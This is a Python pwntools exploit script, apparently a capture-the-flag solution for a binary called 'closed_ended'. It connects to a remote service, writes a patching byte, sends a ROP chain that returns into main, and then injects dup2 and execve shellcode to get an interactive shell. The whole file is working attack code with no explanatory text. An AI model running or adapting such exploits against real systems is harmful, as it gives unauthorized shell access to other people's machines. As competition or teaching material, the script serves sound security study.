from pwn import *
elf = context.binary =  ELF("./closed_ended")
context.log_level = "debug"

# io = process()
io = remote("34.84.25.24", 50037)
gs = '''
# b *main+124
# b *main+46
b *main+0x49
'''
# gdb.attach(io,gdbscript=gs)
canary_address = 0x401116
# one_byte = b"\x74"
one_byte = 0x9f

io.sendline(str(hex(canary_address)))
io.send(pack(one_byte))
shellcode_address = 0x401660+0x12
ret = 0x000000000040101a
rbp =shellcode_address+0x0
ret_address = 0x401070
rop_payload_to_main = b"\x90"*11+pack(rbp)+pack(ret_address)+pack(ret)+pack(0x401105)+pack(0xcafebabe)
io.sendline(rop_payload_to_main)


repair_asm = shellcraft.dup2(0, 1)
shell_asm = shellcraft.sh()
final_assembly = asm(repair_asm + shell_asm)

# print(len(final_assembly))


# for i in range(0,len(final_assembly)):
    # print(i)
# i = 0x0
# io.sendline(str(hex(shellcode_address+i)))
# io.send(pack(final_assembly[i]))
# io.sendline(rop_payload_to_main)

#one time buffer overflow

manual_shellcode = '''
    /* dup2(0, 1) */
    push 33
    pop rax
    xor rdi, rdi
    push 1
    pop rsi
    syscall

    add rsp,14
'''

stack_assembly = asm(manual_shellcode)

rop_payload =pack(shellcode_address+0x40)+b"\x90"*0x2+pack(0xcafebabe)+pack(0xcafebabe)+pack(0x000000401682)+stack_assembly+asm(shellcraft.sh())
print(len(rop_payload))
io.sendline(rop_payload)















io.interactive()
